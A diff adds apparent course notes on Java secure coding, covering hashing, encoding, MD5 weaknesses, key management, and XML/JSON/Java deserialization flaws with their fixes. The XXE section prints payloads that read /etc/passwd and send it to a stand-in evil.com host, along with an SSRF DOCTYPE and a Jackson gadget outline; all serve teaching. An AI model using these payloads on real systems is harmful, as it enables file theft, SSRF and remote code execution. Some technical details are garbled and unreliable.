@@ -1,0 +1,1022 @@
+Josh Cummings
+June 20, 2019
+
+2.1 - The Three Rules of Data Stewardship (Hashing Data)
+	Rules of secure data stewardship
+	The first rule is, if you don't need it, don't ask for it. And quite honestly, consider carefully when you do business with someone that is asking for your personal information
+	The second is, if you do need it once, but not again, then don't store it. Credit card transactions are a great example
+	And the third rule is, if you need to store it, but don't need to see it, then hash it
+
+2.2 - Leveraging Sensitive Log Information
+
+2.3 - Queryable Hashes
+	When it comes to reporting, we certainly don't need to know the session ID. We just need to know which requests belong to the same session. Notice that if I can query these logs, I get the same set of request as if I used a hash of session ID
+	Due to hash collisions, this may not be perfect, but it is certainly a good trade-off from having the session ID and plain text in our logs, and so long as our session IDs are GUIDs, then we can also rest assured that there isn't some reverse lookup table somewhere out there that contains sessions ID hashes
+
+2.4 - Hashing Is Not Encrypting
+	Let's look at a few ways that these logs can be more secure using core java libraries
+	The first one is MessageDigest
+		MessageDigest md = MessageDigest.getInstance("SHA-512")
+	The MessageDigest class performs a hash on any provided array of bytes using a configured algorithm
+		md.update("abcd".getBytes("UTF-8"))
+		byte[] hash = md.digest();
+	It supports MD5, as well as some members of the SHA family and for the trivia expert out there, it actually supports MD2 as well
+	But let's make sure that we understand a few terms before moving forward
+	The first is cipher which means an algorithm that can be applied to a dataset in order to render it unreadable, typically, for the purposes of keeping it secret
+	Some ciphers forever the data unreadable, which are called one-way  ciphers, while others require some kind of key in order to decipher the content
+	The weakest kind of cipher is a substitution cipher. For example, the famous ROT13 substitution cipher, this technically does render text unreadable by rotating each letter 13 places through the alphabet, but it's very easy to decipher, simply by rotating the letters back
+	Secure two-way ciphers are referred t ounder the banner of encyption
+	A hash is a different animal. It's a one-way cipher. It's different because some of the original information is destroyed in the process of creating the hash
+	Let's consider for a minute, a simple hash function that takes 2 digits, adds them, and keeps only the final digit. So if I see the number 5, I don't know whether the original two pieces of information were a two and three, and on and on
+	If we fast forward through a whole bunch of information theory and cryptography, we can take this idea and create something that will transform data in such a way that it's computationally difficult to reverse
+	Now the other term is code, or more typically called encoding. Encoding is another specific application of encipherment and is just as un-secret as things like substitution ciphers
+	Generally, an encoding's purpose is to make a set of bytes easily transmittable to external systems
+	For example, we can URL encode data so that it can be safely sent through a URL without any data being lost or misinterpreted
+	We can HTML encode data so that it can be safely rendered in HTML
+	Or we can Base64 encode data to simply reduce the character set used to represent the data, so we don't have to worry about what character encoding a receiving system is using to interpret the bytes
+
+2.5 - Using MessageDigest
+	So now, let's get back to MessageDigest
+	As I said earlier, it create a hash of the provided set of bytes
+	This isn't encryption. That would be reversible with a key
+	It's not an encoding. That would be, again, reversible but more importantly, it's for the purpose of transmitting this data to an external system, though, stay tuned on that point
+	To use MessageDigest, we first need to get an instance of it like most other things in java
+	Because this is an abstract class, it integrates with an underlying MessageDigest SPI. We use a static factory method instead of a constructor
+	In the getInstance method we'll supply an algorithm. If we're not sure what algorithms our JVM supports, we can use Security.getAlgorithms to confirm
+		Security.getAlgorithms("MessageDigest")
+	Once we have an instance, we can give it messages to digest or hash
+	We can think of MessageDigest a bit like StringBuilder. We should generate a new one each time inspite of the name of the factory method making it sound a whole lot like a singleton
+	Like StringBuilder, we can add progressively to the message what we want to hash, only calling digest when we're finally ready
+	(Demo in jshell showing comparison of MessageDigest and StringBuilder)
+		On StringBuilder side, create new instance and use multiple append() methods to add to the instance vs adding the whole string with append() method. The resulting strings are equal
+		On MessageDigest side, I can create a MessageDigest and then append to it with using the multiple update() methods vs calling update() method on the whole string. The result of calling digest() one each one shows that the result is equal again
+	The difference between the two classes is that MessageDigest is reusable. After calling digest, the underlying byte arrays reset, and I can start calling update again, with a brand new set of bytes
+	Hashing operates at the byte level. We give it a set of bytes, and it returns a set of bytes. But we can't just write a set of bytes to the logs nad expect that to be useful. We need some kind of encoding in order to render the information to some external system
+	A character encoding explains how to interpret a stream of bytes as a stream of characters. Some encodings are more expensive, intending to capture all or most possible characters, like UTF-8, while others are trying to reduce the character set for ease of use and transmission, like Base64 or Hex
+
+2.6 - Encoding in Base64
+	Encoding in Base64 is quick because it was added to java 8 as a core API
+	If you're stuck in java 7 or earlier, though, Apache Commons, as well as Guava have coded libraries that are pretty well worn
+		MessageDigest md = MessageDigest.getInstance("MD5");
+		md.update(session.getId().getBytes(StandardCharsets.UTF_8));
+		String hashed = Base64.getEncoder().encodeToString(md.digest())
+	Once we have our encoder, then we can simply call encodeToString which will essentially convert the bytes written in base 2 to base 64 and then map each new character to a character in the ISO 8859 character encoding
+	Wait, didn't we just say that Base64 wasn't encoding? Why do we need another one?
+	The confusion comes from the fact that we often conflate byte encodings with character encodings. Even though we often see something that is Base64 encoded as a string of characters, it's really just a byte encoding that is then mapped to some string of characters
+	So you might be asking, if we were going to have to pick another character encoding anyway, why not just ISO 8859-1 or UTF-8 in the first place, before writing it to the log file, and just avoid this Base64 thing altogether?
+	It's a good questino and we could have done that, but here's what it would have looked like in the log file. Basically it's a mess
+	Remember that a byte can have a value between -127 and 128. So the digest method emits an array of values where some are negative. Also, some byte values map to control characters, like backspace
+	Mapping these to Base64 eliminates those, reducing the possible values to just 64, namely 65-128, which is much easier to map to characters in the ASCII table
+
+2.7 - Encoding in Hex
+	Another option that comemes up is mapping values to hexadecimal or base 16
+	A nice reason for hashing to hexadecimal is that we don't have a specialized character mapping like Base64 does
+	It does mean, though, that the string is longer. Basically, Base64 will output 4 characters for every 3 bytes it reads in, while Hex will output 4 characters for every 2 bytes
+	That makes Base64 roughly 33% shorter than a hex, which is a nice win in most cases
+	The approach is straightforward
+		String str = "Hello"
+		byte[] bytes = str.getBytes("UTF-8")
+		// 01101000 .....
+		byte[] hashed = md5Hash(bytes);
+		// 01011101 ...
+		// 5 D ....
+
+2.8 - Can I Use MD5?
+	We've mentioned that java natively supports both MD5 and a few SHA algorithms through MessageDigest, but which should we use?
+	MD5 is given such a bad rap. Should I never, ever use it, or are there good rules of thumb?
+	First, you probably won't get a security expert to tell you it's okay to downgrade to a weaker algorithm
+	You won't ever regret using the most secure algorithm you have available to you, and for most java installations that's something from the SHA family
+	The SHA family is also the only set of hashing algorithms provided by java that are FIPS 140-2 compliant
+	That said, let's review some of the weaknesses of MD5, so we can better see where it's a definite no no
+	Let's quickly review 3 terms before diving in
+	First, an algorithm is collision resistant if it's computationally difficult to fashion two different texts that hash to the same value
+	Second, an algorithm is preimage resistant if it's computationally difficult to reverse engineer the original value, given only its hash
+	The third will sound a little bit like the first. An algorithm is second-preimage resistant if it's computationally difficult to find a second value that hashes to the same value as a known original
+	In other words, a preimage attack controls no original values. A second-preimage attack controls one original and a collision attack controls two original values
+	Collision attacks are typically the simplest, so let's talk about those first
+	(Table comparison of Ideal vs MD5 for Collision Resistance)
+	Fundamentally, the birthday paradox puts a practical upper limit on how computationally difficult this can be, which is why hashes get longer as computational resources get faster
+	For example, it will take in the neighborhood of 2^64 random random 128-bit hashes to have a greater than 50% chance of producing a collision, even with a perfectly random hash
+	Due to the flaws with the MD5's algorithm though, collisions can be generated on the order of only 2^24 operations or about a trillion times faster than the ideal. MD5 collisions can be generated on the order of seconds on commodity hardware while ideal collision resistance would take thousands of years
+	Because of this, if the attacker can generate 2 values, ostensibly a good input and a malicious input, then we simply can't use MD5
+	MD5 speed is also a problem here. Some benchmarks list MD5 as being three or four times as fast as SHA, making it, from a time computation standpoint, even more vulnerable to collision attacks
+	Let's take this back to our session ID example. If the end user could arbitrarily specify session IDs, and the code took some kind of action on their hash value, like querying the logs to show the user all their session activity, then we definitely shouldn't use MD5 to hash it to the logs
+	(Table comparison of Ideal vs MD5 for Second-preimage Resistance)
+	Second-preimage attacks are when the hacker knowns both the original and the hash, for example, in the case of file or message integrity
+	Hypothetically, if an attacker is able to provide his own message and our hash isn't second-preimage resistant, he could send his malicious message and forge a legitimate hash for it
+	To date, MD5 is shown to be second-preimage resistant with a work factor of about 2^123, which misses the idea by about 4 orders of magnitude, but this isn't a deal breaker, so MD5 is still used in many cases for integrity checks, like making sure that files on a file system aren't corrupted
+	In places where speed or space trumps that of integrity, MD5 may still be an effective option
+	That power is not a high enough work factor for security related integrity checks, like for authentication, session management, and secure messaging
+	An example is JWTs or JSON Web Tokens. These tokens are used as CSRF tokens, OpenID tokens and more and if we take a look at their specification we can see that there a few signature algorithms that we can pick from for asserting the integrity of a given JWT payload
+	Note that there are no algorithms witha bit length less than 256. Using a bit length of 256 naturally increases the work factor for a second-preimage attack into the astronomical realm
+	The small amount of additional time we spent creating a bigger hash is worth the tradeoff
+	(Table comparison of Ideal vs MD5 for Preimage Resistance)
+	A preimage attack is when the attacker doesn't know the original hash and needs to compute its hash
+	An attacker fashions billions of guesses and if one of those produces the same hash as one of the hashed passwords, the attacker can now log in
+	MD5 is also preimage resistant, again, meaning that if we know the hash it's computationally difficult to find out the original value
+	But, you ask, if MD5 is preimage resistant, why not use it for passwords? The answer is that the practical preimage search space for passwords is much smaller than completely random characters
+	Most people use short memorable passwords across multiple sites using no more than about a set of 65 characters
+	The preimage search space is so small that a typical password cracker can find a six to eight character password almost instantly
+	For logged session IDs though, we have 128 bits of entropy producing the session IDs, making a preimage attack to reverse engineer a session ID, especially before that session expires, nearly impossible
+
+3.1 - Keys in Chuukese (Managing Keys and Certificates)
+	Now it's time for usa to take a look at the third type of cipher in our list
+	We've talked about hashing and encoding, so let's move on to encryption
+	Fundamentally, an ecryption transforms text into a code for the purpsoe of selective security
+
+3.2 - JCA and the Key Interface
+	Most encryption tasks require us to have a key and java provides the Key interface as a handy abstraction
+	Any key we work with in java will at least be able to tell us its algorithm, it's material and the encoding of that material
+	Now the key interface is a parent interface to 3 main super interfaces
+		SecretKey
+		PrivateKey
+			RSAPrivateKey
+			ECPrivateKey
+		PublicKey
+			RSAPublicKey
+			ECPublicKey
+	The first is for symmetric keys, and the second two are for asymmetric keys
+	Under PrivateKey and PublicKey are interfaces for the various algorithms that are supported by core java
+	If we look for implementations of, say, RSAPrivateKey in my IDE (IntelliJ), we won't find any concrete classes from standard java packages but there is one from sun.security.rsa
+	How in the world am I supposed to use this if there are no public implementations?
+	Actually, you might remember that is is reminiscent of MessageDigest. It's not quite the same but MessageDigest abstraction is motivated by the same design goals
+	See, MessageDigest, these key interfaces, and numerous other classes and interfaces are all part of a specification called JCA or Java Cryptography Architecture.
+	Its goal is the same as the goals of other specifications, like JPA or JAX-RS, and that is to provide a common API and to allow providers to implement that API
+	And, like MessageDigest for creating hashes, we have a few classes for creating keys
+		KeyFactory
+		SecretKeyFactory
+		KeyPairGenerator
+		KeyGenerator
+
+3.3 - Key Generators
+	KeyGenerator is in javax.crypto package
+	To create one, we'll follow the same pattern of getting an instance through getInstance method, allowing a provider tto return an implementation, and just like MessageDigest, I'll need to provide an algorithm
+		KeyGenerator.getInstance("AES")
+	I can use Security.getAlgorithms("KeyGenerator") to get a list that my particular JVM supports
+	If you would indulge a man in pet peeve, AES doesn't stand for Asymmetric Encryption Standard. Of all the ways that we can misremember what AES stands for, thinking that the A stands for Asymmetric is basically blasphemy and that's because AES produces the exact opposite. It produces symmetric keys
+	Remember that getInstance doesn't mean that KeyFactory is a singleton. You should think of this as if you were calling the KeyFactory constructor
+	By default, java makes 128 bit AES keys, and this is a good default. In fact, the onlhy cogent argument that I'm aware of for 256 bit AES keys over 128 bit is quantum computing defense
+	Theoretically, quantum computers will be able to complete a given algorithm in the square root number of operations of a conventional computer, making 128 bit AES keys ___ (video ended mid sentence)
+
+3.4 - Key Factories
+	And then we have SecretKeyFactory which we can tell is different by it's suffix
+	Generators create keys out of thin air, but factories exchange keys for what are called specs
+	In fact, let's take the AES key I generated earlier and try to trade it out for a spec
+		SecretKeyFactory.getInstance("AES")
+	(This throws an exception) Well, providers aren't obligated to implement algorithms one to one and we can see that by calling Security.getAlgorithms("SecretKeyFactory"). AES isn't in the list
+	Let's use DES (this one is supported). While admittedly a weak algorithm, it will show us the API while also giving us a hint as to why java doesn't support AES in its factory by default
+		SecretKey des = KeyGenerator.getInstance("DES").generateKey()
+		KeySpec spec = SecretKeyFactory.getInstance("DES").getKeySpec(des, DESKeySpec.class)
+	And I can go back in the other direction too, using my key spec in the generateKey method
+		SecretKey des2 = SecretKeyFactory.getInstance("DES").generateSecret(spec)
+	We can see that the resulting key is equal to the one that I started with
+		des.equals(des2)
+	And yes, the java API designers chose to use the word "generate" in both their factories and their generators, but I digress
+
+3.5 - A Simple Key Service
+	So why would we want to go back and forth between keys and specs?
+	Benefits, we're going to need to switch over to asymmetric keys. And to do that, we'll need to find the appropriate factory, since SecretKeyFactory only works with symmetric keys
+	And it would be so cool if, since the generator is called KeyPairGenerator, the factory were called KeyPairFactory. ___ (not understandable) KeyGenerator maps to SecretKeyFactory and KeyPairGenerator maps to KeyFactory
+		KeyGenerator -> SecretKeyFactory
+		KeyPairGenerator -> KeyFactory
+	KeyGenerator and KeyFactory are for two different types of keys
+	Let's see why we want to have specs. Let's take a key pair I just generated earlier and extract the private key
+		KeyPair pair = KeyPairGenerator.getInstance("RSA").generateKeyPair()
+		
+		PrivateKey privateKey = pair.getPrivate()
+	If I stick to the interface (PrivateKey), which I ought to as much as possible, then I only know the algorithm - getAlgorithm(), the format - getFormat(), and the encoded material - getEncoded()
+	But if I create a KeyFactory, then I get back an object that has  methods like getModulus and getPrivateExponent
+		KeyFactory rsaFactory = KeyFactory.getInstance("RSA")
+		
+		RSAPrivateKeySpec privateSpec = rsaFactory.getKeySpec(privateKey, RSAPrivateKeySpec.class)
+	This key spec I have now is a lot easier to persist since it's just 2 big integers
+	If I write these to a file or something, then I can pick them up later on, populate a spec into a fully fledge private key
+		BigInteger n = privateSpec.getModulus()
+		BigInteger d = privateSpec.getPrivateExponent()
+		
+		rsaFactory.generatePrivate(new RSAPrivateKeySpec(n, d))
+	Let's do a quick activity here, just to cement our understanding of what it takes to manage keys. We'll do this by creating a simple key service. It'll be ____ (video cut off; but in-memory?) though, stay tuned for something more persistent
+	The goal for the next few sections will be implement these methods in a few different ways. Each experiment will reveal nuances of java key management
+
+3.6 - Recreating a KeyPair from a PrivateKey
+
+3.7 - Exchanging Specs for Keys
+	The JCA documentation explains that the spec classes are more appropriate for storage. However, because AES doesn't have a provider specific representation when storing an AES key, we can actually just use the spec object directly
+
+3.8 - The KeyStore API
+	Java ships with stream based support for key management in the form of the KeyStore API
+	If you've ever used keytool before, then you've been using the CLI client for this API
+	KeyStore follows  the same architecture as the other java security classes we've been looking at
+	To get an instance, we call KeyStore.getInstance() and supply the format in which we'd like the keys to be stored
+	By default, keytool uses JKS, which is java proprietary
+	Use security docket algorithms to see what types are supported in your JVM
+
+3.9 - Programmatically Adding Keys to a KeyStore
+	Storing a symmetric key is easy. KeyStore exposes a method called setKeyEntry
+	After we can an instance of KeyStore and load it then, we can call setKeyEntry with the name, key and any password we want to associate with that key
+
+3.10 - Generating Certificates in Java
+	Let's try storing asymmetric key
+	If we try and do it in the same way as we did with the symmetric key, then we'll get an exception that private keys must be stored with a certificate
+	This is a bit of a bummer, since clearly not all private keys require a cert, but remember that this API was originally generated with SSL in mind and a certificate certainly make sense in  that case
+	We're just a little bit stuck too because java has never published an API for generating certificates like it has for keys. There's no certificate generator like there is a key generator or a key pair generator
+	To complete this exercise then, we'll need to reach into another security provider. Until this point, the only provider that we've used is that one that ships with java
+	Add "bouncycastle" dependency and "bouncycastle as a provider" dependency. SunJCE is the default provider but I can call Security.addProvider(new BouncyCastleProvider()) 
+
+3.11 - Key Rotation
+	KeyStores can be pain. They sit on top of file systems, so they can be hard to distribute and rotate. Also, the mismatch between signed and unsigned private keys can be frustrating
+	It would be nice if there was some kind of service that we could use for managing keys, something with a REST API and a nice java client. Even better, something that makes it easy to rotate keys
+	For this last implementation, let's take a look at how Vault, a key management service, when combined with Spring, can help us manage keys in java
+	We'll learn 2 very important things that our current API is woefully lacking in. The first is key rotation and second is what I'll call key isolation
+
+3.12 - Key Management in Vault
+	Any vault installation with the transit secret engine enabled will do just fine
+	We'll add spring vault to our dependencies - "org.springwork.vault:spring-vault-core". This will give us access to a few objects, including the vault template, which, like REST template, we can use to make HTTP calls to vault
+
+3.13 - Converting PKCS#1 to PKCS#8
+
+3.14 - Key Rotation with Vault
+	So what's so great about moving our key generation over to vault? We'll see mroe fo this when we get to talking about signing an encryption, but the fact is that if we allow vault to generate the keys, then it's also possible for vault to seamlessly rotate those keys as well
+	Vault doesn't support auto rotation yet but it does have an easy endpoint for versioning keys
+	To use this, we can quite simply use something like spring scheduling to run a cron that rotates these keys at a regular rate
+
+4.1 - An Insecure EntityResolver Is Worth a Billion Laughs (Serializing and Deserializing Data)
+	(demo of DDoS attack - app accepts XML; comparison of linear and exponential growth) As you can see, I can easily exhaust JVM's memory and deny service to other users in the system
+
+4.2 - Billion Laughs Explained
+	Okay, so what happened? Full disclosure, I did turn of a JVM safety mechanism called jdk.xml.expansionLimit=0 but I'm justified in this because I've seen folks recommending in public forums shutting it off as a work around to other issues
+	It's the same thing that happens whenever a powerful feature is released and that anticipates that users will always use it responsibly
+	First, a very quick XML review
+	I can add an entity to XML that gives a rendering and, like &gt which is an encoded way to say the greater than sign. Security folks are naturally big fans of encoding, and so this is a good thing
+	Where it starts to sound a little risky, though, is when an XML file can define it's own custom entities
+	And obviously, I might do something like creating a variable at the top of my XML file and then refer to it throughout in order to save myself some repetition, and it's even more powerful than that since entities can refer to one another
+	If you're thinking like a hacker right now, you'll see that you can easily take this to an extreme by declaring several entities, each one referring to multiples of the previous one
+	This is exponential growth in action
+	Because I'm referring to this entity in my XML payload, an XML parser is obligated to resolve my entity and to do that it needs to solve 10 of the next entity and so on, down to the final one
+	At the last level, we're resolving a billion entities, and if the XML parser we're using is holding all of this in memory it's easily over a gigabyte
+	And of course, if that wasn't enough, I need to add only 1 more line and I have 10 times the strength in my attack
+
+4.3 - XXE Defined
+	This vulnerablility is in a family of vulnerablilities called XXE or XML External Entity
+	An XXE attack is one that induces a weak XML parser to resolve XML entities that deny services, disclose information, execute remote code, forget server-side requests, and otherwise compromise the system
+	The power of XML entities is not to be undrestated. Several protocols are supported, including file://, HTTP, and even FTP for resolving entities
+	If these can be specified and parsed, then an attacker can read any file or invoke any  endpoint and place the value inside the payload if it suits their purposes
+	Servers that run with elevated privileges are especially vulnerable
+	Imagine for example,  the following payload that reads a sensitive file from the app servers file system, placing the value in the XML
+		<!DOCTYPE request[
+			<!ELEMENT request ANY>
+			<!ENTITY pwd SYSTEM "file://etc/passwd">]>
+		<request>
+			<username>&pwd;</username>
+		</request>
+	In Terracota's bank case, the first payload will become the set of request parameters, and since Terracota reflects invalid data back in the response, the response will contain the contents of the etc password file
+	The second payload is even worse in that it requires no parameter reflection to exfiltrate the data
+		<!DOCTYPE request[
+			<!ENTITY % pwd SYSTEM "file://etc/passwd">
+			<!ENTITY % xxe "<!ENTITY &#25; go 'https://evil?q=%pwd;'>">
+			%xxe;
+		]>
+	It's actually an invalid XML but we can make it valid with just a little bit of clean up
+	For example, the DTD doesn't need to be in line
+		<!DOCTYPE SYSTEM request "https://evil.com/evil.dtd">
+		<request>
+			<username>&pwd;</username>
+		</root>
+	Sicne DTD's can be externally loaded, I can simply point to a remote DTD that has the same information and achieve the same ends
+		<!DOCTYPE SYSTEM root "https://evil.com/eviler.dtd">
+		<root/>
+	Because Terracota bank parses DTDs, it's vulnerable in perhaps less suspicious looking ways and indeed, this simple clean up is just what will also make the hacker successfully exfiltrate with the previous malformed XML
+	And this really just scratches the surface. DTDs are incredibly powerful and thus very hard to offer as an option to the untrusted user
+
+4.4 - Mitigating XXE by Disabling DOCTYPEs
+	Notice though, that all of these vulnerablilities we've seen so far have something in common. They all incubate inside the DOCTYPE declaration and the nice thing is that we can very often live without this declaration, interpreting the XML just fine
+	So hypothetically, if we can tell an XML parser to ignore or disallow the DOCTYPE declaration, then we'll effectively mitigate a host of vulnerablilities
+	The most common XML parsers in java all support a flag to achieve this
+		documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl")
+		saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl")
+		xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl")
+	Of course, the easiest way to stay secure is to reject payloads we don't like
+	This is a solid primary defense against XXE, since we don't need the DOCTYPE in a great number circumstances
+	There are reasons to weigh this against other options though, so we'll see some alternatives in a moment
+
+4.5 - Mitigating XXE with No-op Entity Resolvers
+	Now maybe we do require the DOCTYPE declaration for one reason or another
+	In that case, we need to instead try and bind its numerous arms
+	A simple approach that works with some libraries is to neuter the EntityResolver. The EntityResolver class is what various XML parsers use to process external entities
+	By specifyiong a custom EntityResolver we can take complete control over which external entities, if any, that we care to resolve
+	If your library doesn't support this, then let's check out one more approach that may suffice
+
+4.6 - Mitigating XXE by Disabling Other Features
+	Just like the feature we saw earlier that disallows the DOCTYPE declaration, there are less invasive flags that we can turn off in many java XML parsers
+	It gets a bit harder at this point, though, since you need to know which features your parser supports
+	Generally speaking though, there are 3 features that we need to turn off
+		The first is the ability to load an external DTD, for eample, one that is provided by a malicious user over HTTP. But turning this off, the only DTDs that the parser will accept are those local to the application server
+		The second is the ability to resolve general entities. General entities are those that are specified in the DTD and then used in the XML payload, which are the majority of the volumes we've looked at so far
+		And the third is the ability to resolve parameter entities. Parameter entities are those that are specified in the DTD and used inside the DTD itself. XXE attacks use this technique for data exfiltration
+	If your parser supports these, and you can't simply disable DOCTYPEs altogether, or provide a no-op entity resolver, then you need to find out how to disable these
+
+4.7 - Mitigating XXE with Spring Boot
+	By default, spring web already turns off the DOCTYPE declaration as well as supplies a NO_OP_ENTITY_RESOLVER in it's XML HTTP message converter. This is a great set of defaults to have
+
+4.8 - Non-DOCTYPE XML SSRF Vectors
+	So far we've been talking here or there about a specific type of attack, without really defining it, so let's do that now
+	Server-side request forgery is when an attacker can induce a server-side application to perform a request on its behalf
+	Because the server made the request, it may be seen by the recipient as legitimate
+	We've already seen this once when looking at how external entities can refer to remote endpoints in order to resolve the definitions
+		<!DOCTYPE SYSTEM "https://evil/eviler.dtd">
+	An attacker could misbehave and place a different kind of request here like maybe delete all users in the system
+		<!DOCTYPE SYSTEM http://localhost:8080/deleteAllUsers">
+	A weakly configured parser is obligated to make this request with all the privileges the application is running with
+	Anywhere a user can specify an endpoint and have the server execute it, is a place hackers mind for SSRF vulnerablilities
+	Let's take a look at 2 more
+	the first is the XML include feature. With the correct feature switched on, I can specify the include tag in my XML  with a file reference, and the parser will include the contents of that file in the XML
+	It doesn't have to be XML itself either. For example, I could use this feature to read the etc password file, like I did before, simply by coercing the inclusion to be text instead of XML itself
+		<xi:include href="file:///etc/fstab" parse="text" />
+	Fortunately, java XML parsers don't have this feature turned on by default, however, the most secure position is for us to turn this off explicitly
+		factory.setFeature("http://apache.org/xml/features/xinclude", false)
+	I can do this in the same way as before with the setFeature method. If this feature isn't supported by your parser, it will throw an exception, so make sure to test before releasing
+	The second is XML namespaces
+	The schemaLocation value is like a space delimited map, so each odd element is a key, and each even element is the actual XSD location
+		xsi:schemaLocation="http://myschema http://evil.com/location"
+	If the XML parser hits that remote endpoint, the hacker has another vector for SSRF
+
+4.9 - Haters Gonna Hate
+	(this is your moment to gripe about XML and why JSON is so much cooler)
+	Now we'd be lying to ourselves if we thought that XML was the only thing that had these kinds of problems. Indeed, any payload that can define it's own references, list remotely resolvable fragments, or otherwise specify endpoints may  be vulnerable
+	(example of a YAML payload with self-references) I mentioned this specifically, since at the time of this writing YAML is the new hotness. YAML supports self-references and as such, can induce a parser into a denial of service fit of memory soaking rage
+	Again, be aware of the capabilities of your parser and shut off features taht you don't need
+
+4.10 - Java and the Deserialization Apocalypse
+	Whether it's XML, JSON, java serialization or something proprietary, we typically want to make these documents and deserialize them into java objects
+	This typically involves a few steps
+		First, parse the document. We might bring it into memory all at once as an AST or might bring it in as a stream of tokens
+		Then for each element, identify the corresponding java type and instantiate it
+		Map its children recursively to the appropriate member in the java instance
+		And then finally, return the fully instantiated object
+	XXE attacks generally live in the first of these steps
+	In recent years though, it's been demonstrated that there are numerous java applications that are vulnerable in the second and third steps
+	That is, once the document is parsed, attackers can arbitrarily indicate the java type to deserialize into or it can inject or induce malicious behavior while the data is being coerced into java types
+
+4.11 - A JSON RCE Attack
+	(demo of sending a json request and that launches calculator app on the machine) How did this happen? It comes from some misuse of a couple of powerful features in Jackson, which is a popular JSON serialization library for java
+	The first is Jackson's ability to simply take any JSON payload and deserialize it into a map of string object
+	The hacker can't do much evil with string, but by definition, the options are virtually limitless with object
+	This isn't inherently a problem, though since Jackson by default, will interpret each JSON property as it's JSON primitive, that is, an array, a string or a number
+	However, when we combine this with a very powerful feature in Jackson called Default Typing, it becomes too unwieldy for untrusted payloads
+		ObjectMapper#globalDefaultTyping()
+	When default typing is enabled globally, it means that Jackson will look for a special field in the provided JSON to decide what java object to deserialize into
+		{ 
+			"username" : [
+				"org.apache.xalan.xsltc.trax.TemplatesImpl",
+				{ 
+					"transletByteCodes": [....],
+					"transletName" : "foo",
+					"outputProperties" : {}
+				}
+			]
+		}
+
+4.12 - Mitigating Jackson Insecure Deserialization by Avoiding Default Typing
+	But how bad could that be, since the hacker is constrained only to the objects on the class path?
+	Well, let's say that there is an object that has a field that accepts raw byte code and let's also say that when a related method is invoked, that raw bytecode is materialized into a class and constructed
+		getOutputProperties {
+			return newTransformer() ...
+		}
+		
+		newTransformer() {
+			return new TransformerImpl(getTransletInstance() ...)
+		}
+		
+		getTransletInstance() {
+			clazz = defineClass(_transletBytecodes);
+			translet = clazz.newInstance();
+		}
+	Does that sound like crazy talk? Actually, that's exactly the behavior of one famous class commonly found on java workloads
+	If that class is on your class path, and you have global default typing turned on, then I can simply indicate that class in my JSON payload and the server is obligated to follow my instructions  upon deserialization
+	Of course, the deserialization will ultimately fail, but that wasn't the point
+	The point was simply to get malicious code to execute, which is exactly what happened
+	So the first step in solving this problem is simple, which is to avoid enabling this feature globally
+	This is switched off by default, so we can fix this simply by deleting the appropriate line in Terracota
+	But what if we do have something that does rely on serializing the java type into the payload? For that, the second step is to not give hackers a blank check by saying that literally anything that extends object is okay for the being you were trying to deserialize into
+	We can achiee this by whitelisting the type information using JSON type info, JSON subtypes, and JSON type name
+
+4.13 - Mitigating Jackson Insecure Deserialization with Whitelisting
+	@JsonTypeInfo
+	@JsonSubTypes
+	@JsonTypeName
+	Of course, this can be a bit difficult to scale, and it is a little verbose, but Jackson also provides the type ID resolver interface, which we can implement for greater versatility
+
+4.14 - What's Wrong with Java Serialization
+	The magical payload that we saw with Jackson is called a serialization gadget. More specifically, a serialization gadget is a mechanism that takes advantage of loose type definitions to construct malicious payloads at deserialization time
+	Now if there's one feature in java that has caused it's maintainers a great deal of security heartburn over the years, it's java serialization
+		class MyClass implements Serializable
+		
+		objectOutputStream.writeObject(new MyClass());
+		MyClass myClass = (MyClass) objectInputStream.readObject();
+	Briefly, I can serialize a java's state into a number of formats like XML and JSON, and java offers it's own proprietary format
+	In order to access this feature, your class or one of its super classes or interfaces needs to extend of implement Serializable
+	Then I can use object input and output streams to read and write java state out to an external system
+	The difficulties that this simple idea has inflicted on the community are vast. Let's look at some immediate implications of the design goals of java serialization
+	First, in order for java serialization to be able to write data and read it back in with high fidelity, it writes out the class name information for each data type
+	If this sounds familiar, that's because we just saw the problems that caused this with Jackson. However, this problem is a lot harder to solve because, at least with Jackson, the feature can be turned on and off, but with java serialization the ability for a hacker to apply the type information in a java serialized object is always on
+	Second, because it uses this marker interface strategy, I as a developer, may not know that a given class is Serializable in the first place
+	If I inherit from a class that in turn inherits Serializable, I am opted in
+	These days, there's talk about removing java serialization from java altogether, although, that's going to take some time to accomplish
+	In the meanwhile, what should we do?
+	Now I'm not going to demo another Terracota vulnerability since it's largely the sample in principle as what we just saw in Jackson, though ther is one available in the code sample
+	We simply need to find some java deserialization endpiont and provide a payload that specifies a vulnerable java class as a member variable, and we're in
+	Now correct usage of java serialization can get very tricky. So let's look at the simplest remediations for this problem
+	The first is to disallow serialization. This of course, is the simplest. first, don't feed untrusted input into object input stream. In fact, I recommend avoiding java serialization altogether
+	Second, if your object is not intended to be serialized, you can say so out loud by overriding two special methods, readObject() and writeObject()
+	When we override these methods, we're customizing the serialization process. In our case, our customization is going to be to throw an exception, effectively disabling the feature
+	Fundamentally, this is the most secure way to ensure your object can't be part of an insecure deserialization attack using java serialization
+	It's probably just a bit more common though, that you're listening to this because you actually have something to deserialize. And because we're living in a place where default typing is active globally, we basically need to check the type ourselves
+
+4.15 - Inadequately Mitigating Java Insecure Deserialization
+	(demo of Person object) This, of course, has the same problem as before, in that it takes an object for one of its member variables
+	But it has another problem spot too, and that is the list. Java serialization respects type Arrays here at runtime, which means that it will allow me to deserialize any object into this list, including my EvilObject
+		Person in = new Person (new EvilObject(false), Arrays.asList("some", "address"))
+	In the java world, we might try and solve this by implementing readObject, the special method for customizing Java deserialization
+	We can try and check the type of each object as it's read in, including checking each array list element but this misunderstands what's going on
+	If we understand the steps for deserialization, we can see why this doesn't and indeed can't possibly go far enough
+	Recall step number 2, java serialization identifies the type and constructs it
+	Even if the object in the payload were malicious, we can't check it here with our instanceof until it's already been constructed
+	In the case of an attack, the bad stuff has already happened
+
+4.16 - Mitigating Java Insecure Deserialization with Whitelisting
+	To effectively guard agianst this problem, we need to go one level deeper to the input stream itself
+	ObjectInputStream has a method called resolveClass. This method is invoked as it's reading the object stream and deciding what is the class of the next set of bytes
+	If we know what types are legitimate for our member variables, then we can whitelist them here, disallowing any type that doesn't fit our criteria
+	(demo of creating a whitelist array) I'll create a whitelist object input stream that takes a list of allowed types and then I'll override the resolveClass method
+	In that method, I'll check ObjectStreamClass.getName against the whitelist throwing an exception if things don't match up
